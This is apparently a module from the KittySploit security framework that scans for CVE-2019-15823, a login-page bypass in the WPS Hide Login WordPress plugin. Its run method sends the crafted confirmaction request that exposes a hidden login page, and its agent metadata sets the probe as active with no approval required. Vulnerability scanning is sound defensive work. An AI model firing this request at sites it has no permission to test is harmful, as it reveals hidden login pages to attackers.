#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WPS-Hide-Login plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WPS Hide Login <= 1.5.2.2  - Login Page Bypass Detection',
        'description': 'WPS-Hide-Login plugin before 1.5.3 for WordPress contains an action=confirmaction protection bypass, letting attackers bypass security checks, exploit requires sending crafted requests.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'wp', 'disclosure', 'wps-hide-login', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://web.archive.org/web/20230601185557/https://secupress.me/blog/wps-hide-login-v1-5-2-2-multiples-vulnerabilities/',
            'https://web.archive.org/web/20230711062924/https://wpscan.com/vulnerability/9469/',
        ],
        'cve': 'CVE-2019-15823',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=True)
        if not r:
            return False
        path = '/wp-login.php?SECUPRESSaction=confirmaction'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Username or Email Address</label>', 'wp-login-lost-password',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='WPS Hide Login <= 1.5.2.2  - Login Page Bypass detected', path=path)
            return True
        return False

